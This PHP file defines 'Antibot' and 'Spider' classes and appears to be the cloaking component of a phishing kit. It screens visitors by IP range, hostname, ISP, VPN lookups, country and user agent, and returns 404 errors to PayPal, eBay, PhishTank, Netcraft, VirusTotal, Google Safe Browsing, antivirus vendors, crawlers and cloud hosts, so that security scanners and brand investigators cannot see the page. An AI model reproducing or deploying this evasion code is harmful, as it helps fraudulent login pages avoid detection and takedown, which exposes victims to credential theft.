<?php

    require_once 'Comp.php';
    $comps = new Comp;
    $_SESSION['ip'] = $comps->getIP();
    $_SESSION['ipDetails'] = $comps->getIPDetails();

    class Antibot extends Comp
    {
        private $rangePath;

        function __construct()
        {
            if (file_exists("./Guard/Gradle/heart.txt")) {
                $this->rangePath = "./Guard/Gradle/heart.txt";
            } elseif (file_exists("../../Guard/Gradle/heart.txt")) {
                $this->rangePath = "../../Guard/Gradle/heart.txt";
            } else {
                $this->rangePath = "../Guard/Gradle/heart.txt";
            }
            
            if (!file_exists($this->rangePath)) {
                throw new Exception("IP list does not exist.", 1);
            }
        }

        public function throw404() {
            http_response_code(404);
        }

        public function ipRange($userIP) {
            if (!filter_var($userIP, FILTER_VALIDATE_IP)) {
                throw new Exception("Valid IPV4 or IPV6 Address Required.", 1);
            }
    
            $handle = fopen($this->rangePath, "r");
            while (($line = fgets($handle)) !== false) {
                $line = trim($line);

                if (substr($line, 0, 1) == "#") {
                    continue;
                }

                if (
                    filter_var($line, FILTER_VALIDATE_IP) &&
                    $userIP == $line
                ) {
                    return 1;
                }
    
                if (strpos("/" . $line . "/", '*')) {
                    if (strpos("/" . $line . "/", '^')) {
                        if (fnmatch(str_replace('^', '', $line), $userIP)) {
                            return 1;
                        }
                    }
                    if (fnmatch($line, $userIP)) {
                        return 1;
                    }
                }
    
                if (strpos($line, '-')) {
                    $ranges = explode("-", $line, 2);
                    $min = ip2long(trim($ranges[0]));
                    $max = ip2long(trim($ranges[1]));
    
                    if (
                        !filter_var(long2ip($min), FILTER_VALIDATE_IP) ||
                        !filter_var(long2ip($max), FILTER_VALIDATE_IP)
                    ) {
                        continue;
                    }
    
                    if (
                        ip2long($userIP) >= $min &&
                        ip2long($userIP) <= $max
                    ) {
                        return 1;
                    }
                }
            }
            return 0;
            fclose($handle);
        }

        public function checkHost() {
            $badHosts = array(
                "teledata-fttx.de",
                "hicoria.com",
                "simtccflow1.etn.com",
                "above",
                "google",
                "softlayer",
                "amazonaws",
                "cyveillance",
                "phishtank",
                "dreamhost",
                "netpilot",
                "calyxinstitute",
                "tor-exit",
                "msnbot",
                "p3pwgdsn",
                "netcraft",
                "trendmicro",
                "ebay",
                "paypal",
                "torservers",
                "messagelabs",
                "sucuri.net",
                "crawler",
                "duckduck",
                "feedfetcher",
                "BitDefender",
                "mcafee",
                "antivirus",
                "cloudflare",
                "p3pwgdsn",
                "avg",
                "avira",
                "avast",
                "ovh.net",
                "security",
                "twitter",
                "bitdefender",
                "virustotal",
                "phising",
                "clamav",
                "baidu",
                "safebrowsing",
                "eset",
                "mailshell",
                "azure",
                "miniature",
                "tlh.ro",
                "aruba",
                "dyn.plus.net",
                "pagepeeker",
                "SPRO-NET-207-70-0",
                "SPRO-NET-209-19-128",
                "vultr",
                "colocrossing.com",
                "geosr",
                "drweb",
                "dr.web",
                "linode.com",
                "opendns",
                'cymru.com',
                'sl-reverse.com',
                'surriel.com',
                'hosting',
                'orange-labs',
                'speedtravel',
                'metauri',
                'apple.com',
                'bruuk.sk',
                'sysms.net',
                'oracle',
                'cisco',
                'amuri.net',
                "versanet.de",
                "hilfe-veripayed.com",
                "googlebot.com",
                "upcloud.host",
                "nodemeter.net",
                "e-active.nl",
                "downnotifier",
                "online-domain-tools",
                "fetcher6-2.go.mail.ru",
                "uptimerobot.com",
                "monitis.com",
                "colocrossing.com",
                "majestic12",
                "as9105.com",
                "btcentralplus.com",
                "anonymizing-proxy",
                "digitalcourage.de",
                "triolan.net",
                "staircaseirony",
                "stelkom.net",
                "comrise.ru",
                "kyivstar.net",
                "mpdedicated.com",
                "starnet.md",
                "progtech.ru",
                "hinet.net",
                "is74.ru",
                "shore.net",
                "cyberinfo",
                "ipredator",
                "unknown.telecom.gomel.by",
                "minsktelecom.by",
                "parked.factioninc.com",
                "avast",
                "prcdn.net",
                "google"
            );
            
            foreach ($badHosts as $badHost) {
                if (preg_match("/" . $badHost . "/i", gethostbyaddr($_SESSION['ip'])) >= 1) {
                    return 1;
                }
            }
            return 0;
        }

        public function checkISP() {
            $badISPs = array(
                'Peak 10',
                'Quasi Networks LTD',
                'SC Rusnano',
                'GoDaddy.com, LLC',
                'Server Plan S.r.l.',
                'Linode',
                'Blazing SEO',
                'Lixux OU',
                'Inter Connects Inc',
                'Flokinet Ltd',
                'LukMAN Multimedia Sp. z o.o',
                'PIPEX-BLOCK1',
                'IPVanish',
                'LinkGrid LLC',
                'Snab-Inform Private Enterprise',
                'Cisco Systems',
                'Network and Information Technology Limited',
                'London Wires Ltd.',
                'Tehnologii Budushego LLC',
                'Eonix Corporation',
                'hosttech GmbH',
                'Wowrack.com',
                'SunGard Availability Services LP',
                'Internap Network Services Corporation',
                'Palo Alto Networks',
                'PlusNet Technologies Ltd',
                'Scaleway',
                'Facebook',
                'Host1Plus',
                'XO Communications',
                'Nobis Technology Group',
                'ExpressVPN',
                'DME Hosting LLC',
                'Prescient Software',
                'Sungard Network Solutions',
                'OVH SAS',
                'Iomart Hosting Ltd',
                'Hosting Solution',
                'Barracuda Networks',
                'Sungard Network Solutions',
                'Solar VPS',
                'PHPNET Hosting Services',
                'DigitalOcean',
                'Level 3 Communications',
                'softlayer',
                'Chelyabinsk-Signal LLC',
                'SoftLayer Technologies',
                'Complete Internet Access',
                'london-tor.mooo.com',
                'amazonaws',
                'cyveillance',
                'phishtank',
                'tor.piratenpartei-nrw.de',
                'cpanel66.proisp.no',
                'tor-node.com',
                'dreamhost',
                'Involta',
                'exit0.liskov.tor-relays.net',
                'tor.tocici.com',
                'netpilot',
                'calyxinstitute',
                'tor-exit',
                'msnbot',
                'p3pwgdsn',
                'netcraft',
                'University of Virginia',
                'trendmicro',
                'ebay',
                'paypal',
                'torservers',
                'comodo',
                'EGIHosting',
                'ebbs.healingpathsolutions.com',
                'healingpathsolutions.com',
                'Solution Pro',
                'Zayo Bandwidth',
                'spider.clicktargetdevelopment.com',
                'clicktargetdevelopment.com',
                'static.spro.net',
                'Digital Ocean',
                'Internap Network Services Corporation',
                'Blue Coat Systems',
                'GANDI SAS',
                'roamsite.com',
                'PIPEX-BLOCK1',
                'ColoUp',
                'Westnet',
                'The University of Tokyo',
                'University',
                'University of',
                'QuadraNet',
                'exit-01a.noisetor.net',
                'noisetor.net',
                'noisetor',
                'vultr.com',
                'Zscaler',
                'Choopa',
                'RedSwitches Pty',
                'Quintex Alliance Consulting',
                'www16.mailshell.com',
                'this.is.a.tor.exit-node.net',
                'this.is.a.tor.node.xmission.com',
                'colocrossing.com',
                'DedFiberCo',
                'crawl',
                'sucuri.net',
                'crawler',
                'proxy',
                'enom',
                'cloudflare',
                'yahoo',
                'trustwave',
                'rima-tde.net',
                'tfbnw.net',
                'pacbell.net',
                'tpnet.pl',
                'ovh.net',
                'centralnic',
                'badware',
                'phishing',
                'antivirus',
                'SiteAdvisor',
                'McAfee',
                'Bitdefender',
                'avirasoft',
                'phishtank.com',
                'OVH SAS',
                'Yahoo',
                'Yahoo! Inc.',
                'Google',
                'GoDaddy',
                'Amazon Technologies Inc.',
                'Amazon',
                'Top Level Hosting SRL',
                'Twitter',
                'Microsoft',
                'Microsoft Corporation',
                'OVH',
                'VPSmalaysia.com.my',
                'Madgenius.com',
                'Barracuda Networks Inc.',
                'Barracuda',
                'SecuredConnectivity.net',
                'Digital Domain',
                'Hetzner Online',
                'Akamai',
                'SoftLayer',
                'SURFnet',
                'Creative Thought Inc.',
                'Fastly',
                'Return Path Inc.',
                'WhatsApp',
                'Instagram',
                'Schulte Consulting LLC',
                'Universidade Federal do Rio de Janeiro',
                'Sectoor',
                'Bitfolk',
                'Team Technologies LLC',
                'Mainloop',
                'Junk Email Filter Inc.',
                'Art Matrix - Lightlink Inc.',
                'Redpill Linpro AS',
                'CloudFlare',
                'ESET spol. s r.o.',
                'AVAST Software s.r.o.',
                'Dosarrest',
                'Apple Inc.',
                'Symantec',
                'Mozilla',
                'Netprotect SRL',
                'Host Europe GmbH',
                'Host Sailor Ltd.',
                'PSINet Inc.',
                'Daniel James Austin',
                'RamNode',
                'Hostalia',
                'Xs4all Internet BV',
                'Inktomi Corporation',
                'Eircom Customer Assignment',
                '9New Network Inc',
                'Sony',
                'Private IP Address LAN',
                'Computer Problem Solving',
                'Fortinet',
                'Avira',
                'Rackspace',
                'Baidu',
                'Comodo',
                'Incapsula Inc',
                'Orange Polska Spolka Akcyjna',
                'Infosphere',
                'Private Customer',
                'SurfControl',
                'University of Newcastle upon Tyne',
                'Total Server Solutions',
                'LukMAN',
                'eSecureData',
                'Hosting',
                'VI Na Host Co. Ltd',
                'B2 Net Solutions',
                'Master Internet',
                'Global Perfomance',
                'Fireeye',
                'AntiVirus',
                'Security',
                'Intersoft Internet',
                'Voxility',
                'Linode',
                'Internet-Pro',
                'Trustwave Holdings Inc',
                'Online SAS',
                'Versaweb',
                'Liquid Web',
                'A100 ROW',
                'Apexis AG',
                'Apexis',
                'LogicWeb',
                'Virtual1 Limited',
                'VNET a.s.',
                'Static IP Assignment',
                'TerraTransit AG',
                'Merit Network',
                'PathsConnect',
                'Long Thrive',
                'LG DACOM',
                'Secure Internet',
                'Kaspersky',
                'UK Dedicated Servers Limited',
                'Customer Network',
                'Flokinet',
                'Simpli Networks LLC',
                'Psychz',
                'PrivateSystems Networks',
                'ScanSafe Services',
                'CachedNet',
                'CloudVPN',
                'Spark New Zealand Trading Ltd',
                'Whitelabel IT Solutions Corp',
                'Hostwinds',
                'Hosteros LLC',
                'HostUS',
                'Host',
                'ClientID',
                'Server',
                'Oracle',
                'Fortinet',
                'Unus Inc.',
                'Public facing services',
                'Virtual Employee Pvt Ltd',
                'Dataline Ltd',
                'Teksavvy Solutions Inc.',
                'UPC Romania Bucuresti',
                'TalkTalk Communications Limited',
                'British Telecommunications PLC',
                'Global Data Networks LLC',
                'Quintex Alliance Consulting',
                'Online S.A.S.',
                'Content Delivery Network Ltd',
                'Nobis Technology Group LLC',
                'Parrukatu',
                'JSC ER-Telecom Holding',
                'ChinaNet Fujian Province Network',
                'QualityNetwork',
                'Vist On-Line Ltd',
                'The Calyx Institute',
                'Internet Customers',
                'OJSC Oao Tattelecom',
                'Petersburg Internet Network Ltd.',
                'Psychz Networks',
                'Udasha',
                'Onavo Mobile Ltd',
                'Cubenode System SL',
                'OVH Hosting Inc.',
                'NForce Entertainment B.V.',
                'DigitalOcean LLC',
                'Glenayre Electronics Inc.',
                'British Telecommunications PLC',
                'Iomart Hosting Limited',
                'Digital Energy Technologies Limited',
                'Private Customer',
                'Cisco Systems Inc.',
                'Vultr Holdings LLC',
                'Amazon.com Inc.',
                'Web Hosting Solutions',
                'Time Warner Cable Internet LLC',
                'Internet Security - TC',
                'Vertical Telecoms Broadband Networks and Internet Provider',
                'Ventelo Wholesale',
                'MYX Group LLC',
                'France Telecom S.A.',
                'Online S.A.S.',
                'Nine Internet Solutions AG',
                'Microsoft Azure',
                'Choopa, LLC',
                'Amazon',
                'HighWinds Network',
                'Amazon.com',
                'Bell Canada',
                'Digital Ocean',
                'M247 LTD Frankfurt Infrastructure',
                'Palo Alto Networks',
                'Spectrum',
                'ImOn Communications, LLC',
                'Wintek Corporation',
                'ServerMania',
                'Claro Dominican Republic',
                '013 NetVision',
                'Amazon.com',
                'Digital Ocean',
                'TalkTalk',
                'HostDime.com',
                'AVAST Software s.r.o.',
                'Host1Plus Cloud Servers',
                'Amazon Data Services NoVa',
                'Google Cloud',
                'M-net',
                'Digiweb ltd',
                'Prescient Software',
                'Eir Broadband',
                'Solution Pro',
                'Bell Canada',
                'Linode',
                'DigitalOcean',
                'Plusnet',
                'GigeNET',
                'ZenLayer',
                'NFOrce Entertainment B.V.',
                'NewMedia Express',
                'Telegram Messenger Network',
                'IQ PL Sp. z o.o.',
                'Datacamp Limited',
                'Tahoe Internet Exchange (TahoeIX)',
                'ITCOM Shpk',
                'HEG US'
            );

            $ISP = $_SESSION['ipDetails']['isp'];

            foreach ($badISPs as $badISP) {
                if (preg_match("/" . $badISP . "/i", $ISP)) {
                    return 1;
                    break;
                }
            }
            return 0;
        }

        public function checkVPN() {
            if (!$this->localhost($this->getIP())) {
                if ($this->curlX("http://blackbox.ipinfo.app/lookup/" . $this->getIP()) == "Y") {
                    return 1;
                } else {
                    if ($this->curlX("https://api.iptrooper.net/check/" . $this->getIP()) == "1") {
                        return 1;
                    }
                }
                return 0;
            }
        }

        public function checkHVPN() {
            if ($this->localhost($this->getIP())) {
                return $this->curlX("http://check.getipintel.net/check.php?ip=17.3.2.5&contact=samsung@samsung.com&format=json");
            } else {
                return $this->curlX("http://check.getipintel.net/check.php?ip=" . $this->getIP() . "&contact=samsung@samsung.com&format=json");
            }
        }

        public function countryLock() {
            if ($this->localhost($this->getIP())) {
                if (json_decode($this->curlX("https://extreme-ip-lookup.com/json/1.33.213.231"), true)['countryCode'] == $this->settings()['LockCountry']) {
                    return 1;
                }
                return 0;
            } else {
                if (json_decode($this->curlX("https://extreme-ip-lookup.com/json/" . $this->getIP()), true)['countryCode'] == $this->settings()['LockCountry']) {
                    return 1;
                }
                return 0;
            }
        }
    }

    class Spider extends Comp
    {
        private $spiderNames = array(
            "gmetrix",
            "headless",
            "virus",
            "virustotal",
            "SiteChecker",
            "cloud",
            "bot",
            "above",
            "google",
            "docomo",
            "mediapartners",
            "phantomjs",
            "lighthouse",
            "reverseshorturl",
            "samsung-sgh-e250",
            "softlayer",
            "amazonaws",
            "cyveillance",
            "crawler",
            "gsa-crawler",
            "phishtank",
            "dreamhost",
            "netpilot",
            "calyxinstitute",
            "tor-exit",
            "apache-httpclient",
            "lssrocketcrawler",
            "urlredirectresolver",
            "jetbrains",
            "spam",
            "windows 95",
            "windows 98",
            "acunetix",
            "netsparker",
            "007ac9",
            "008",
            "Feedfetcher",
            "192.comagent",
            "200pleasebot",
            "360spider",
            "4seohuntbot",
            "50.nu",
            "a6-indexer",
            "admantx",
            "amznkassocbot",
            "aboundexbot",
            "aboutusbot",
            "abrave spider",
            "accelobot",
            "acoonbot",
            "addthis.com",
            "adsbot-google",
            "ahrefsbot",
            "alexabot",
            "amagit.com",
            "analytics",
            "antbot",
            "apercite",
            "aportworm",
            "EBAY",
            "CL0NA",
            "jabber",
            "arabot",
            "hotmail!",
            "msn!",
            "baidu",
            "outlook!",
            "outlook",
            "msn",
            "duckduckbot",
            "hotmail",
            "go-http-client",
            "go-http-client",
            "trident",
            "presto",
            "virustotal",
            "unchaos",
            "dreampassport",
            "sygol",
            "nutch",
            "privoxy",
            "zipcommander",
            "neofonie",
            "abacho",
            "acoi",
            "acoon",
            "adaxas",
            "agada",
            "aladin",
            "alkaline",
            "amibot",
            "anonymizer",
            "aplix",
            "aspseek",
            "avant",
            "baboom",
            "anzwers",
            "anzwerscrawl",
            "crawlconvera",
            "del.icio.us",
            "camehttps",
            "annotate",
            "wapproxy",
            "translate",
            "ask24",
            "asked",
            "askaboutoil",
            "fangcrawl",
            "amzn_assoc",
            "bingpreview",
            "dr.web",
            "drweb",
            "bilbo",
            "blackwidow",
            "sogou",
            "sogou-test-spider",
            "exabot",
            "externalhit",
            "ia_archiver",
            "googletranslate",
            "proxy",
            "dalvik",
            "quicklook",
            "seamonkey",
            "sylera",
            "safebrowsing",
            "safesurfingwidget",
            "preview",
            "whatsapp",
            "telegram",
            "instagram",
            "zteopen",
            "icoreservice",
            "untrusted",
            "crawl",
            "slurp",
            "spider",
            "seek",
            "accoona",
            "adressendeutschland",
            "ah-ha",
            "ahoy",
            "altavista",
            "ananzi",
            "anthill",
            "appie",
            "arachnophilia",
            "arale",
            "araneo",
            "aranha",
            "architext",
            "aretha",
            "arks",
            "asterias",
            "atlocal",
            "atn",
            "atomz",
            "augurfind",
            "backrub",
            "baypup",
            "bdfetch",
            "bigbrother",
            "biglotron",
            "bjaaland",
            "blaiz",
            "bloodhound",
            "boitho",
            "booch",
            "bradley",
            "butterfly",
            "calif",
            "cassandra",
            "ccubee",
            "cfetch",
            "charlotte",
            "churl",
            "cienciaficcion",
            "cmc",
            "collective",
            "comagent",
            "combine",
            "computingsite",
            "csci",
            "curl",
            "cusco",
            "daumoa",
            "deepindex",
            "delorie",
            "depspid",
            "deweb",
            "dieblindekuh",
            "digger",
            "ditto",
            "dmoz",
            "downloadexpress",
            "dtaagent",
            "dwcp",
            "ebiness",
            "ebingbong",
            "e-collector",
            "ejupiter",
            "emacs-w3searchengine",
            "esther",
            "evliyacelebi",
            "ezresult",
            "falcon",
            "felixide",
            "ferret",
            "fetchrover",
            "fido",
            "findlinks",
            "fireball",
            "fishsearch",
            "fouineur",
            "funnelweb",
            "gazz",
            "gcreep",
            "genieknows",
            "getterroboplus",
            "geturl",
            "glx",
            "goforit",
            "golem",
            "grabber",
            "grapnel",
            "gralon",
            "griffon",
            "gromit",
            "grub",
            "gulliver",
            "hamahakki",
            "harvest",
            "havindex",
            "helix",
            "heritrix",
            "hkuwwwoctopus",
            "homerweb",
            "htdig",
            "htmlindex",
            "html_analyzer",
            "htmlgobble",
            "hubater",
            "hyper-decontextualizer",
            "ibm_planetwide",
            "ichiro",
            "iconsurf",
            "iltrovatore",
            "image.kapsi.net",
            "imagelock",
            "incywincy",
            "indexer",
            "infobee",
            "informant",
            "ingrid",
            "inktomisearch.com",
            "inspectorweb",
            "intelliagent",
            "internetshinchakubin",
            "ip3000",
            "iron33",
            "israeli-search",
            "ivia",
            "jakarta",
            "javabee",
            "jetbot",
            "jumpstation",
            "katipo",
            "kdd-explorer",
            "kilroy",
            "knowledge",
            "kototoi",
            "kretrieve",
            "labelgrabber",
            "lachesis",
            "larbin",
            "libwww",
            "linkalarm",
            "linkvalidator",
            "linkscan",
            "lockon",
            "lwp",
            "lycos",
            "magpie",
            "mantraagent",
            "mapoftheinternet",
            "marvin",
            "mattie",
            "mediafox",
            "mercator",
            "merzscope",
            "microsofturlcontrol",
            "minirank",
            "miva",
            "mj12",
            "mnogosearch",
            "moget",
            "monster",
            "moose",
            "motor",
            "multitext",
            "muncher",
            "muscatferret",
            "mwd.search",
            "myweb",
            "najdi",
            "nameprotect",
            "nationaldirectory",
            "nazilla",
            "ncsabeta",
            "nec-meshexplorer",
            "nederland.zoek",
            "netcartawebmapengine",
            "netmechanic",
            "netresearchserver",
            "netscoop",
            "newscan-online",
            "nhse",
            "nokia6682",
            "nomad",
            "noyona",
            "siteexplorer",
            "nzexplorer",
            "objectssearch",
            "occam",
            "omni",
            "opentext",
            "openfind",
            "openintelligencedata",
            "orbsearch",
            "osis-project",
            "packrat",
            "pageboy",
            "pagebull",
            "page_verifier",
            "panscient",
            "parasite",
            "partnersite",
            "patric",
            "pegasus",
            "peregrinator",
            "pgpkeyagent",
            "phantom",
            "phpdig",
            "picosearch",
            "piltdownman",
            "pimptrain",
            "pinpoint",
            "pioneer",
            "piranha",
            "plumtreewebaccessor",
            "pogodak",
            "poirot",
            "pompos",
            "poppelsdorf",
            "poppi",
            "populariconoclast",
            "psycheclone",
            "publisher",
            "python",
            "rambler",
            "ravensearch",
            "roach",
            "roadrunner",
            "roadhouse",
            "robbie",
            "robofox",
            "robozilla",
            "rules",
            "salty",
            "sbider",
            "scooter",
            "scoutjet",
            "scrubby",
            "search.",
            "searchprocess",
            "semanticdiscovery",
            "senrigan",
            "sg-scout",
            "shai'hulud",
            "shark",
            "shopwiki",
            "sidewinder",
            "sift",
            "silk",
            "simmany",
            "sitesearcher",
            "sitevalet",
            "sitetech-rover",
            "skymob.com",
            "sleek",
            "smartwit",
            "sna-",
            "snappy",
            "snooper",
            "sohu",
            "speedfind",
            "sphere",
            "sphider",
            "spinner",
            "spyder",
            "steeler",
            "suke",
            "suntek",
            "supersnooper",
            "surfnomore",
            "sven",
            "szukacz",
            "tachblackwidow",
            "tarantula",
            "templeton",
            "teoma",
            "t-h-u-n-d-e-r-s-t-o-n-e",
            "theophrastus",
            "titan",
            "titin",
            "tkwww",
            "toutatis",
            "t-rex",
            "tutorgig",
            "twiceler",
            "twisted",
            "ucsd",
            "udmsearch",
            "urlcheck",
            "updated",
            "vagabondo",
            "valkyrie",
            "verticrawl",
            "victoria",
            "vision-search",
            "volcano",
            "voyager",
            "voyager-hc",
            "w3c_validator",
            "w3m2",
            "w3mir",
            "walker",
            "wallpaper",
            "wanderer",
            "wauuu",
            "wavefire",
            "webcore",
            "webhopper",
            "webwombat",
            "webbandit",
            "webcatcher",
            "webcopy",
            "webfoot",
            "weblayers",
            "weblinker",
            "weblogmonitor",
            "webmirror",
            "webmonkey",
            "webquest",
            "webreaper",
            "websitepulse",
            "websnarf",
            "webstolperer",
            "webvac",
            "webwalk",
            "webwatch",
            "webzinger",
            "wget",
            "whizbang",
            "whowhere",
            "wildferret",
            "worldlight",
            "wwwc",
            "wwwster",
            "xenu",
            "xget",
            "xift",
            "xirq",
            "yandex",
            "yanga",
            "yeti",
            "yodao",
            "zao",
            "zippp",
            "zyborg",
            "proximic",
            "Googlebot",
            "Baiduspider",
            "Cliqzbot",
            "Genieo",
            "BomboraBot",
            "CCBot",
            "URLAppendBot",
            "DomainAppender",
            "msnbot-media",
            "Antivirus",
            "YoudaoBot",
            "MJ12bot",
            "linkdexbot",
            "applebot",
            "metauri.com",
            "Twitterbot",
            "R6_FeedFetcher",
            "NetcraftSurveyAgent",
            "Sogouwebspider",
            "bingbot",
            "Yahoo!Slurp",
            "facebookexternalhit",
            "PrintfulBot",
            "msnbot",
            "UnwindFetchor",
            "urlresolver",
            "TweetmemeBot",
            "PaperLiBot",
            "Ezooms",
            "YandexBot",
            "SearchmetricsBot",
            "picsearch",
            "TweetedTimesBot",
            "QuerySeekerSpider",
            "ShowyouBot",
            "woriobot",
            "merlinkbot",
            "BazQuxBot",
            "Kraken",
            "SISTRIXCrawler",
            "R6_CommentReader",
            "magpie-crawler",
            "GrapeshotCrawler",
            "PercolateCrawler",
            "MaxPointCrawler",
            "NetSeercrawler",
            "grokkit-crawler",
            "SMXCrawler",
            "PulseCrawler",
            "Y!J-BRW",
            "Mediapartners-Google",
            "Spinn3r",
            "InAGist",
            "Python-urllib",
            "NING",
            "TencentTraveler",
            "Feedfetcher-Google",
            "mon.itor.us",
            "spbot",
            "Feedly",
            "java",
            "crawler",
            "Lighthouse"
        );

        public function checkSpider() {
            if (trim($this->getUserAgent()) == "") {
                return 1;
                die();
            }

            foreach ($this->spiderNames as $spiderName) {
                if (preg_match('/' . $spiderName . '/i', $this->getUserAgent()) >= 1) {
                    return 1;
                    break;
                }
            }
            return 0;
        }
    }